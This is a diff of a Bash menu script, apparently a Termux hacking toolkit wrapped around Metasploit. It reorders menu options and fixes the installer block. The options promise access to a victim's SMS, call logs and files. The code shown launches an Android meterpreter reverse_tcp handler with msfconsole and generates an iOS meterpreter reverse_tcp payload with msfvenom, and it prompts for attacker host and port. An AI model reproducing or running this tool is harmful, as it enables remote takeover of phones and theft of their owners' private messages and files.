@@ -40,11 +40,10 @@ echo "            [5]Breakthrough via Port (21)????"
 echo "            [6]Breakthrough via Port (445)????"
 echo "            [7]open (sms,calllog,....txt) The victim ????????   "
 echo "            [8]Open the victim files that you downloaded ???? "
-echo "            [9]Download msf ??????"
+echo "            [9]Breakthrough by malicious link ???"
 echo "            [10]error metasploit ??????             "
 echo "            [11]Download msf (5.0.0)??????"
 echo "            [12]payload ios ???????"
-echo "            [13]Breakthrough by malicious link ???"
 echo -e "$green"
 read -p "     number------->  " Zoal
 #--------------------------------------------------
@@ -85,7 +84,7 @@ echo -e $blue "Please Insert PORT :>"
 read -p "                    LPORT----->" lport
 msfconsole -x 'use multi/handler' -x 'set payload android/meterpreter/reverse_tcp' -x 'set LHOST '$host -x 'set LPORT '$port -x 'exploit'
 
-fi 
+fi
 
 if [ $Zoal -eq 4 ]
 then
@@ -146,16 +145,6 @@ termux-open $n
 echo ""
 fi
 
-if [ $Zoal -eq 9 ]
-then
-
-rm -rf $HOME/metasploit-framework
-rm -rf $HOME/metasploit.sh
-cp .metasploit.sh $HOME/metasploit.sh
-chmod +x $HOME/metasploit.sh
-sh $HOME/metasploit.sh
-fi
-
 if [ $Zoal -eq 10 ]
 then
 echo -e "++++++++++++++++> please wait <++++++++++++++++"
@@ -166,20 +155,18 @@ fi
 
 if [ $Zoal -eq 11 ]
 then
-         'echo -e "$g+++++++++++++++>$p[Please Wait]$g<+++++++++++++++++"
-         cd
-         git clone https://github.com/rapid7/metasploit-framework
-         bundle install
-         clear
-         echo -e "$g+++++++++++++++>$p[Please Wait]$g<+++++++++++++++++"
-         gem install crass -v '1.0.4' --source 'https://rubygems.org/'
-         cd
-         cd metasploit-framework
-         bundle update nokogiri
-         echo -e "$g++++++++++>$p[end Download metasploit]$g<++++++++++++"
-         sleep 1
-         metasploit.sh'
-         fi
+echo -e "$g+++++++++++++++>$p[Please Wait]$g<+++++++++++++++++"
+git clone https://github.com/rapid7/metasploit-framework
+bundle install
+clear
+echo -e "$g+++++++++++++++>$p[Please Wait]$g<+++++++++++++++++"
+gem install crass -v '1.0.4' --source 'https://rubygems.org/'
+cd metasploit-framework
+bundle update nokogiri
+echo -e "$g++++++++++>$p[end Download metasploit]$g<++++++++++++"
+sleep 1
+metasploit.sh
+fi
 
 if [ $Zoal -eq 12 ]
 then
@@ -194,7 +181,7 @@ read -p "                      Path----->" path
 msfvenom -p apple_ios/aarch64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $path/$name.api
 fi
 
-if [ $Zoal -eq 13 ]
+if [ $Zoal -eq 9 ]
 then
 echo -e $green "Please Insert SRVHOST :>"
 read -p "                     LHOST----->" host
